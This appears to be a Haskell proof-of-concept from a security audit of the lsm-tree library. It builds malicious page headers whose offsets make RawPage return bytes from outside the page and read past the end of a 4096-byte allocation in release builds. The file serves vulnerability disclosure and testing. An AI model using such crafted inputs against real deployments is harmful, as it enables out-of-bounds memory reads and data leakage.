-- | PoC: RawPage trusts page-header offsets with no validation.
--
-- Target : IntersectMBO/lsm-tree @ 63a6305 (audited 2026-11-17)
-- Claim  : rawPageKeys/rawPageKeyAt/rawPageIndex derive byte offsets straight
--          from the on-disk page header (Word16 numKeys at idx 0, Word16
--          keysOffset at idx 2). Nothing validates those offsets against the
--          4096-byte page size, and RawBytes.fromByteArray does no bounds
--          check either. Only -fcheck-prim-bounds (present in cabal.project,
--          ABSENT from cabal.project.release) would catch the read.
--
-- Demo   : one ByteArray of 8192 bytes. First 4096 = the page. Bytes
--          4096..8191 = memory OUTSIDE the page. Header says "keys start at
--          byte 4096", offsets vector says "key 0 lives at byte 5000..5004",
--          and bytes 5000..5004 hold a sentinel. If rawPageKeys returns the
--          sentinel, the page handed out bytes from outside its own region.
--
--          In production readDiskPage allocates EXACTLY 4096 bytes
--          (RunReader.hs:314 newPinnedByteArray pageSize), so the same header
--          makes the slice point past the end of the allocation: OOB heap read.
--
--          Variant 2 repeats with a real 4096-byte array and keysOffset =
--          0xFFF0 to show the release build does not throw.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Data.Primitive.ByteArray
import           Data.Word (Word16, Word8)
import           Database.LSMTree.Internal.RawBytes (RawBytes (..))
import qualified Database.LSMTree.Internal.RawBytes as RB
import           Database.LSMTree.Internal.RawPage
import           Database.LSMTree.Internal.Serialise (SerialisedKey (..))

pageSize :: Int
pageSize = 4096

-- | Write a Word16 into the array at Word16-index @i@.
putW16 :: MutableByteArray RealWorld -> Int -> Word16 -> IO ()
putW16 = writeWord16Array

putBytes :: MutableByteArray RealWorld -> Int -> [Word8] -> IO ()
putBytes mba off ws =
    mapM_ (\(i, w) -> writeWord8Array mba (off + i) w) (zip [0 ..] ws)

sentinel :: [Word8]
sentinel = map (fromIntegral . fromEnum) "LEAK-OUTSIDE-THE-PAGE"

-- | Deterministic proof: the page hands out bytes that live outside the
-- 4096-byte page region.
variantOutsidePageRegion :: IO ()
variantOutsidePageRegion = do
    mba <- newPinnedByteArray (2 * pageSize) :: IO (MutableByteArray RealWorld)
    fillByteArray mba 0 (2 * pageSize) 0
    -- header: numKeys=2, numBlobs=0, keysOffset=4096 (bytes) -> Word16 idx 2048
    putW16 mba 0 2
    putW16 mba 1 0
    putW16 mba 2 (fromIntegral pageSize)
    -- offsets vector sits at byte 4096: [5000, 5005, 5005]
    putW16 mba 2048 5000
    putW16 mba 2049 5005
    putW16 mba 2050 5005
    -- the "key" payload lives at byte 5000 -- outside the page region
    putBytes mba 5000 sentinel
    ba <- unsafeFreezeByteArray mba
    let page = unsafeMakeRawPage ba 0
    putStrLn $ "  sizeofByteArray        = " ++ show (sizeofByteArray ba)
    putStrLn $ "  page region            = bytes 0..4095"
    putStrLn $ "  rawPageNumKeys         = " ++ show (rawPageNumKeys page)
    let keys = rawPageKeys page
    putStrLn $ "  rawPageKeys            = " ++ show (map renderKey keys)
    let leaked = any (\(SerialisedKey rb) -> RB.unpack rb == sentinel) keys
    putStrLn $ "  sentinel from outside page region returned? " ++ show leaked
    putStrLn $ if leaked
      then "  RESULT: FAIL-OPEN -- offsets beyond the page were honoured"
      else "  RESULT: guard present (offsets rejected or bounded)"

-- | Production shape: array is exactly 4096 bytes, header points far outside.
variantPastEndOfAllocation :: IO ()
variantPastEndOfAllocation = do
    mba <- newPinnedByteArray pageSize :: IO (MutableByteArray RealWorld)
    fillByteArray mba 0 pageSize 0
    putW16 mba 0 2
    putW16 mba 1 0
    putW16 mba 2 0xFFF0          -- keys section "at byte 65520" in a 4096-byte page
    ba <- unsafeFreezeByteArray mba
    let page = unsafeMakeRawPage ba 0
    r <- try (evaluate (length (rawPageKeys page))) :: IO (Either SomeException Int)
    putStrLn $ "  sizeofByteArray        = " ++ show (sizeofByteArray ba)
    putStrLn $ "  keysOffset (header)    = 0xFFF0 = 65520 bytes"
    putStrLn $ "  rawPageKeys            = " ++ either (\e -> "threw: " ++ show e) (\n -> "returned " ++ show n ++ " keys, no exception") r
    putStrLn $ case r of
      Left _  -> "  RESULT: bounded (exception raised)"
      Right _ -> "  RESULT: FAIL-OPEN -- read past the end of the allocation"

renderKey :: SerialisedKey -> String
renderKey (SerialisedKey rb) = show (RB.unpack rb)

main :: IO ()
main = do
    putStrLn "=== lsm-tree RawPage offset validation PoC ==="
    putStrLn "[1] page region 4096 B, header points at byte 4096+ (deterministic)"
    variantOutsidePageRegion
    putStrLn ""
    putStrLn "[2] page = exactly 4096 B, header points at byte 65520 (production shape)"
    variantPastEndOfAllocation
    putStrLn ""
    putStrLn "Guard under test: -fcheck-prim-bounds (in cabal.project, absent in cabal.project.release)"
